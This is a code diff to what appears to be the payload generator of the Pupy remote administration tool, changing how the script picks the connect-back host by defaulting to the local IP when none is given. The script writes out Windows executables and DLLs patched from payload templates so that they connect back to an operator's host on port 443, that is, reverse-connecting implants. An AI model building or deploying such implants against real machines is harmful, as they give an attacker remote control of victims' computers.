@@ -18,6 +18,7 @@
 import argparse
 import sys
 import os.path
+from pupylib.utils.network import get_local_ip
 
 def get_edit_pupyx86_dll(host, ip):
 	return get_edit_binary(os.path.join("payload_templates","pupyx86.dll"), host, ip)
@@ -60,32 +61,41 @@ if __name__=="__main__":
 	parser.add_argument('-t', '--type', default='exe_x86', choices=['exe_x86','exe_x64','dll_x86','dll_x64'], help="(default: exe_x86)")
 	parser.add_argument('-o', '--output', help="output path")
 	parser.add_argument('-p', '--port', type=int, default=443, help="connect back ip (default:443)")
-	parser.add_argument('host', help="connect back host")
+	parser.add_argument('host', nargs='*', help="connect back host")
 	args=parser.parse_args()
+	myhost=None
+	if not args.host:
+		myip=get_local_ip()
+		if not myip:
+			sys.exit("[-] couldn't find your local IP. You must precise an ip or a fqdn manually")
+		myhost=myip
+	else:
+		myhost=args.host
+	
 	outpath=None
 	if args.type=="exe_x86":
-		binary=get_edit_pupyx86_exe(args.host, args.port)
+		binary=get_edit_pupyx86_exe(myhost, args.port)
 		outpath="pupyx86.exe"
 		if args.output:
 			outpath=args.output
 		with open(outpath, 'wb') as w:
 			w.write(binary)
 	elif args.type=="exe_x64":
-		binary=get_edit_pupyx64_exe(args.host, args.port)
+		binary=get_edit_pupyx64_exe(myhost, args.port)
 		outpath="pupyx64.exe"
 		if args.output:
 			outpath=args.output
 		with open(outpath, 'wb') as w:
 			w.write(binary)
 	elif args.type=="dll_x64":
-		binary=get_edit_pupyx64_dll(args.host, args.port)
+		binary=get_edit_pupyx64_dll(myhost, args.port)
 		outpath="pupyx64.dll"
 		if args.output:
 			outpath=args.output
 		with open(outpath, 'wb') as w:
 			w.write(binary)
 	elif args.type=="dll_x86":
-		binary=get_edit_pupyx86_dll(args.host, args.port)
+		binary=get_edit_pupyx86_dll(myhost, args.port)
 		outpath="pupyx86.dll"
 		if args.output:
 			outpath=args.output
@@ -93,7 +103,7 @@ if __name__=="__main__":
 			w.write(binary)
 	else:
 		exit("Type %s is invalid."%(args.type))
-	print "binary generated to %s with HOST=%s"%(outpath,(args.host, args.port))
+	print "binary generated to %s with HOST=%s"%(outpath,(myhost, args.port))
 
 
 
